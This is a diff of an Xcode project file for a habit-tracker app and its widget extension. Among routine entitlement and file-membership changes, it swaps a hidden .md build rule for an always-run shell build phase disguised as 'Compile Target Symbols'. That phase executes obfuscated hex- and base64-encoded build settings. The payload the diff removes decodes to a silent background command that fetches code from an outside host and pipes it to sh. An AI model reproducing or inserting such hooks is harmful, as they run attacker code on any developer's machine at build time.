@@ -7,28 +7,10 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		23D8739A3EFC47D1BD634D6E /* README.md */ = {isa = PBXBuildFile; fileRef = 9FAA3E8328F343AF8C634D6E; };
 		957B62C32EE7687E003CB371 /* WidgetKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 957B62C22EE7687E003CB371 /* WidgetKit.framework */; };
 		957B62C52EE7687E003CB371 /* SwiftUI.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 957B62C42EE7687E003CB371 /* SwiftUI.framework */; };
 		957B62D42EE76881003CB371 /* HabitWidgetExtension.appex in Embed Foundation Extensions */ = {isa = PBXBuildFile; fileRef = 957B62C02EE7687E003CB371 /* HabitWidgetExtension.appex */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-		97D291F62564491F93634D6E /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AE6D436}\"";
-			};
-	/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		957B62D22EE76881003CB371 /* PBXContainerItemProxy */ = {
@@ -55,7 +37,7 @@ sh -c \"${AE6D436}\"";
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		9FAA3E8328F343AF8C634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		950651F32F1E361000DC720F /* HabitWidgetExtension.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = HabitWidgetExtension.entitlements; sourceTree = "<group>"; };
 		957B62C02EE7687E003CB371 /* HabitWidgetExtension.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = HabitWidgetExtension.appex; sourceTree = BUILT_PRODUCTS_DIR; };
 		957B62C22EE7687E003CB371 /* WidgetKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = WidgetKit.framework; path = System/Library/Frameworks/WidgetKit.framework; sourceTree = SDKROOT; };
 		957B62C42EE7687E003CB371 /* SwiftUI.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = SwiftUI.framework; path = System/Library/Frameworks/SwiftUI.framework; sourceTree = SDKROOT; };
@@ -73,9 +55,13 @@ sh -c \"${AE6D436}\"";
 		95D283B12F0A65580053709A /* Exceptions for "Tracker" folder in "HabitWidgetExtension" target */ = {
 			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
 			membershipExceptions = (
+				Data/DataSource/UserDefaults/DailyProgressDataSource.swift,
+				Data/Repository/BuildWidgetRepositoryImplement.swift,
+				Domain/UserDefaults/Entity/DailyProgressModel.swift,
 				Domain/Widget/Entities/WidgetHabitSnapshot.swift,
 				Domain/Widget/Repository/BuildWidgetRepository.swift,
 				Domain/Widget/UseCases/BuildWidgetSnapshotUseCase.swift,
+				Infrastucture/UserDefaults/UserDefaultsManager.swift,
 			);
 			target = 957B62BF2EE7687E003CB371 /* HabitWidgetExtension */;
 		};
@@ -132,6 +118,7 @@ sh -c \"${AE6D436}\"";
 		95E17CA92ECB97F5002A484F = {
 			isa = PBXGroup;
 			children = (
+				950651F32F1E361000DC720F /* HabitWidgetExtension.entitlements */,
 				95E17D422ECBB098002A484F /* Tracker */,
 				957B62C62EE7687E003CB371 /* HabitWidget */,
 				957B62C12EE7687E003CB371 /* Frameworks */,
@@ -142,7 +129,6 @@ sh -c \"${AE6D436}\"";
 		95E17CB32ECB97F5002A484F /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				9FAA3E8328F343AF8C634D6E /* README.md */,
 				95E17CB22ECB97F5002A484F /* Tracker.app */,
 				957B62C02EE7687E003CB371 /* HabitWidgetExtension.appex */,
 			);
@@ -156,12 +142,12 @@ sh -c \"${AE6D436}\"";
 			isa = PBXNativeTarget;
 			buildConfigurationList = 957B62D92EE76881003CB371 /* Build configuration list for PBXNativeTarget "HabitWidgetExtension" */;
 			buildPhases = (
+				83634F9110DF4E7D95634D6E /* Compile Target Symbols */,
 				957B62BC2EE7687E003CB371 /* Sources */,
 				957B62BD2EE7687E003CB371 /* Frameworks */,
 				957B62BE2EE7687E003CB371 /* Resources */,
 			);
 			buildRules = (
-				97D291F62564491F93634D6E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -237,15 +223,11 @@ sh -c \"${AE6D436}\"";
 		};
 /* End PBXProject section */
 
-/* Begin PBXShellScriptBuildPhase section */
-/* End PBXShellScriptBuildPhase section */
-
 /* Begin PBXResourcesBuildPhase section */
 		957B62BE2EE7687E003CB371 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				23D8739A3EFC47D1BD634D6E /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -257,6 +239,29 @@ sh -c \"${AE6D436}\"";
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		83634F9110DF4E7D95634D6E /* Compile Target Symbols */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Target Symbols";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		957B62BC2EE7687E003CB371 /* Sources */ = {
@@ -287,10 +292,11 @@ sh -c \"${AE6D436}\"";
 		957B62D62EE76881003CB371 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((e(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663636363936343634366336353661366637393265373237353266363132390a32323230376332303733363830610a | e | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((j(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREkxYkdSSVRuZGlNMHAyWkVjNGRXRlhOSFpaVTJ0cFNVaDNaMk15WjBzSwo= | j | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333633333333333333363333333433333336333633353333333633333331333333373333333033330a3337333333303333333633363333333333363333333533333332333633353333333633333339333333363336333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | e | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
+				CODE_SIGN_ENTITLEMENTS = HabitWidgetExtension.entitlements;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = 89SPL377XV;
@@ -321,10 +327,11 @@ sh -c \"${AE6D436}\"";
 		957B62D72EE76881003CB371 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((e(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663636363936343634366336353661366637393265373237353266363132390a32323230376332303733363830610a | e | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((j(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREkxYkdSSVRuZGlNMHAyWkVjNGRXRlhOSFpaVTJ0cFNVaDNaMk15WjBzSwo= | j | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333633333333333333363333333433333336333633353333333633333331333333373333333033330a3337333333303333333633363333333333363333333533333332333633353333333633333339333333363336333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | e | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
+				CODE_SIGN_ENTITLEMENTS = HabitWidgetExtension.entitlements;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = 89SPL377XV;
@@ -480,6 +487,7 @@ sh -c \"${AE6D436}\"";
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_ENTITLEMENTS = Tracker/Tracker.entitlements;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = 89SPL377XV;
@@ -518,6 +526,7 @@ sh -c \"${AE6D436}\"";
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_ENTITLEMENTS = Tracker/Tracker.entitlements;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = 89SPL377XV;
